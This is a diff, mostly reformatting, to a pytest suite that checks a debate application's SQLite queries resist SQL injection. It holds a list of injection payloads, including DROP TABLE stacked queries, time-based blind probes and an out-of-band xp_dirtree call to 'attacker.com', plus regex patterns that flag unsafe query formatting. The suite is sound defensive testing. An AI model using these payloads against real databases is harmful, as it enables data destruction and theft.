@@ -28,7 +28,8 @@ def mock_db_connection():
     cursor = conn.cursor()
 
     # Create test tables matching production schema
-    cursor.executescript("""
+    cursor.executescript(
+        """
         CREATE TABLE debates (
             id TEXT PRIMARY KEY,
             topic TEXT,
@@ -110,7 +111,8 @@ def mock_db_connection():
         INSERT INTO consensus VALUES
             (1, 'Topic A', 'Conclusion A', 0.9, 0.8, '2024-01-01'),
             (2, 'Topic B', 'Conclusion B', 0.6, 0.5, '2024-01-02');
-    """)
+    """
+    )
 
     conn.commit()
     yield conn
@@ -128,52 +130,40 @@ SQL_INJECTION_PAYLOADS = [
     "' OR 1=1 --",
     "'; DELETE FROM debates; --",
     "' UNION SELECT * FROM debates --",
-
     # Stacked queries
     "1; DROP TABLE debates",
     "1; INSERT INTO debates VALUES ('hacked', 'hacked', 0, 0, 'now', 'evil')",
-
     # Comment injection
     "test'/*",
     "test*/",
     "test'--",
     "test'#",
-
     # Boolean-based blind injection
     "' AND 1=1 --",
     "' AND 1=2 --",
     "' AND (SELECT COUNT(*) FROM debates) > 0 --",
-
     # Time-based blind injection
     "'; WAITFOR DELAY '0:0:5' --",  # SQL Server
     "' AND SLEEP(5) --",  # MySQL
     "'; SELECT pg_sleep(5) --",  # PostgreSQL
-
     # Union-based injection
     "' UNION SELECT null, null, null, null, null, null --",
     "' UNION ALL SELECT * FROM debates --",
-
     # Error-based injection
     "' AND 1=CONVERT(int, @@version) --",
     "' AND extractvalue(1, concat(0x7e, version())) --",
-
     # Out-of-band injection
     "'; EXEC xp_dirtree '//attacker.com/share' --",
-
     # Second-order injection
     "admin'--",
     "admin' AND 1=1 --",
-
     # Encoding bypasses
     "%27%20OR%201%3D1",  # URL encoded
     "\\' OR 1=1 --",  # Backslash escape
-
     # NULL byte injection
     "test\x00' OR 1=1 --",
-
     # Unicode/wide character injection
     "test\u0027 OR 1=1 --",
-
     # Polyglot payloads
     "SLEEP(1) /*' OR SLEEP(1) OR '\" OR SLEEP(1) OR \"*/",
 ]
@@ -193,10 +183,7 @@ class TestParameterizedQueries:
 
         for payload in SQL_INJECTION_PAYLOADS:
             # Safe parameterized query
-            cursor.execute(
-                "SELECT * FROM debates WHERE topic = ?",
-                (payload,)
-            )
+            cursor.execute("SELECT * FROM debates WHERE topic = ?", (payload,))
             results = cursor.fetchall()
 
             # Should return empty (no match), not error or return all rows
@@ -207,19 +194,21 @@ class TestParameterizedQueries:
         cursor = mock_db_connection.cursor()
 
         # Safe parameterized LIMIT
-        cursor.execute(
-            "SELECT * FROM debates LIMIT ?",
-            (10,)
-        )
+        cursor.execute("SELECT * FROM debates LIMIT ?", (10,))
         results = cursor.fetchall()
         assert len(results) <= 10
 
         # Attempting to inject via LIMIT should fail with type error
-        with pytest.raises((sqlite3.ProgrammingError, sqlite3.InterfaceError, sqlite3.IntegrityError, TypeError, ValueError)):
-            cursor.execute(
-                "SELECT * FROM debates LIMIT ?",
-                ("1; DROP TABLE debates; --",)
+        with pytest.raises(
+            (
+                sqlite3.ProgrammingError,
+                sqlite3.InterfaceError,
+                sqlite3.IntegrityError,
+                TypeError,
+                ValueError,
             )
+        ):
+            cursor.execute("SELECT * FROM debates LIMIT ?", ("1; DROP TABLE debates; --",))
 
     def test_org_id_filtering_injection(self, mock_db_connection):
         """Test org_id WHERE clause is immune to injection."""
@@ -227,10 +216,7 @@ class TestParameterizedQueries:
 
         for payload in SQL_INJECTION_PAYLOADS:
             # Simulates billing.py query pattern
-            cursor.execute(
-                "SELECT * FROM usage_events WHERE org_id = ?",
-                (payload,)
-            )
+            cursor.execute("SELECT * FROM usage_events WHERE org_id = ?", (payload,))
             results = cursor.fetchall()
             assert len(results) == 0, f"Org ID injection matched: {payload}"
 
@@ -346,7 +332,7 @@ class TestTableColumnInjection:
                 r'f["\']INSERT INTO\s*\{',
                 r'f["\']UPDATE\s*\{',
                 r'f["\']DELETE FROM\s*\{',
-                r'\.format\([^)]*\).*(?:SELECT|INSERT|UPDATE|DELETE)',
+                r"\.format\([^)]*\).*(?:SELECT|INSERT|UPDATE|DELETE)",
             ]
 
             for pattern in dangerous_patterns:
@@ -369,8 +355,8 @@ class TestTableColumnInjection:
 
             # Check for dynamic column name patterns
             dangerous_patterns = [
-                r'ORDER BY\s*\{',
-                r'GROUP BY\s*\{',
+                r"ORDER BY\s*\{",
+                r"GROUP BY\s*\{",
                 r'f["\'].*WHERE\s+\{[^}]+\}\s*=',
             ]
 
@@ -389,10 +375,7 @@ class TestConcurrentInjection:
 
         async def attempt_injection(payload):
             cursor = mock_db_connection.cursor()
-            cursor.execute(
-                "SELECT * FROM debates WHERE topic = ?",
-                (payload,)
-            )
+            cursor.execute("SELECT * FROM debates WHERE topic = ?", (payload,))
             return cursor.fetchall()
 
         # Run multiple injection attempts concurrently
@@ -418,7 +401,7 @@ class TestSecondOrderInjection:
         payload = "' OR 1=1 --"
         cursor.execute(
             "INSERT INTO debates VALUES (?, ?, ?, ?, ?, ?)",
-            ("d_test", payload, 0, 0.5, "2024-01-01", "org_test")
+            ("d_test", payload, 0, 0.5, "2024-01-01", "org_test"),
         )
         mock_db_connection.commit()
 
@@ -427,10 +410,7 @@ class TestSecondOrderInjection:
         stored_topic = cursor.fetchone()[0]
 
         # Using stored data in another query should still be parameterized
-        cursor.execute(
-            "SELECT * FROM consensus WHERE topic = ?",
-            (stored_topic,)
-        )
+        cursor.execute("SELECT * FROM consensus WHERE topic = ?", (stored_topic,))
         results = cursor.fetchall()
 
         # Should not return all rows despite stored injection payload
@@ -456,10 +436,7 @@ class TestEncodingBypass:
             # Decode (simulating web server processing)
             decoded = urllib.parse.unquote(encoded_payload)
 
-            cursor.execute(
-                "SELECT * FROM debates WHERE topic = ?",
-                (decoded,)
-            )
+            cursor.execute("SELECT * FROM debates WHERE topic = ?", (decoded,))
             results = cursor.fetchall()
             assert len(results) == 0
 
@@ -474,10 +451,7 @@ class TestEncodingBypass:
         ]
 
         for payload in unicode_payloads:
-            cursor.execute(
-                "SELECT * FROM debates WHERE topic = ?",
-                (payload,)
-            )
+            cursor.execute("SELECT * FROM debates WHERE topic = ?", (payload,))
             results = cursor.fetchall()
             assert len(results) == 0
 
@@ -496,10 +470,7 @@ class TestBatchOperations:
         ]
 
         # executemany with parameterized query
-        cursor.executemany(
-            "INSERT INTO debates VALUES (?, ?, ?, ?, ?, ?)",
-            batch_data
-        )
+        cursor.executemany("INSERT INTO debates VALUES (?, ?, ?, ?, ?, ?)", batch_data)
         mock_db_connection.commit()
 
         # Verify data was inserted literally, not executed
@@ -580,7 +551,7 @@ class TestConsensusHandler:
                    WHERE confidence >= ?
                    ORDER BY confidence DESC, timestamp DESC
                    LIMIT ?""",
-                (confidence, 10)
+                (confidence, 10),
             )
             results = cursor.fetchall()
             assert isinstance(results, list)
@@ -594,13 +565,15 @@ class TestDashboardHandler:
         cursor = mock_db_connection.cursor()
 
         # Static query - no injection vector
-        cursor.execute("""
+        cursor.execute(
+            """
             SELECT
                 COUNT(*) as total,
                 SUM(CASE WHEN consensus_reached THEN 1 ELSE 0 END) as consensus_count,
                 AVG(confidence) as avg_conf
             FROM debates
-        """)
+        """
+        )
         result = cursor.fetchone()
         assert result is not None
         assert result[0] >= 0  # total count
@@ -616,7 +589,7 @@ class TestDashboardHandler:
                        SUM(CASE WHEN consensus_reached THEN 1 ELSE 0 END) as recent_consensus
                    FROM debates
                    WHERE created_at >= ?""",
-                (payload,)
+                (payload,),
             )
             result = cursor.fetchone()
             assert result is not None
@@ -650,9 +623,9 @@ class TestRegressionSafety:
                     # Check for dangerous patterns
                     if re.search(r'execute\s*\(\s*f["\']', line):
                         violations.append(f"{filepath}:{i}: f-string in execute()")
-                    if re.search(r'execute\s*\([^)]+\.format\s*\(', line):
+                    if re.search(r"execute\s*\([^)]+\.format\s*\(", line):
                         violations.append(f"{filepath}:{i}: .format() in execute()")
-                    if re.search(r'execute\s*\([^)]+%\s*\(', line):
+                    if re.search(r"execute\s*\([^)]+%\s*\(", line):
                         violations.append(f"{filepath}:{i}: % formatting in execute()")
 
         assert len(violations) == 0, f"SQL injection risks found:\n" + "\n".join(violations)
@@ -681,16 +654,20 @@ class TestRegressionSafety:
                     content = f.read()
 
                 # Count queries with WHERE clause (these need parameters if using user input)
-                where_clauses = re.findall(r'\.execute\s*\([^;]*WHERE[^;]*\)', content, re.DOTALL | re.IGNORECASE)
+                where_clauses = re.findall(
+                    r"\.execute\s*\([^;]*WHERE[^;]*\)", content, re.DOTALL | re.IGNORECASE
+                )
                 total_with_where += len(where_clauses)
 
                 # Count safe patterns:
                 # 1. WHERE with ? placeholder
                 safe_patterns += len(re.findall(r'WHERE[^"\']*=\s*\?', content, re.IGNORECASE))
                 # 2. execute(query, params) pattern
-                safe_patterns += len(re.findall(r'\.execute\s*\(\s*query\s*,\s*(?:params|tuple)', content))
+                safe_patterns += len(
+                    re.findall(r"\.execute\s*\(\s*query\s*,\s*(?:params|tuple)", content)
+                )
                 # 3. execute(query, (values)) pattern
-                safe_patterns += len(re.findall(r'\.execute\s*\([^,]+,\s*\(', content))
+                safe_patterns += len(re.findall(r"\.execute\s*\([^,]+,\s*\(", content))
 
         # Verify majority of WHERE queries use parameterized patterns
         if total_with_where > 0:
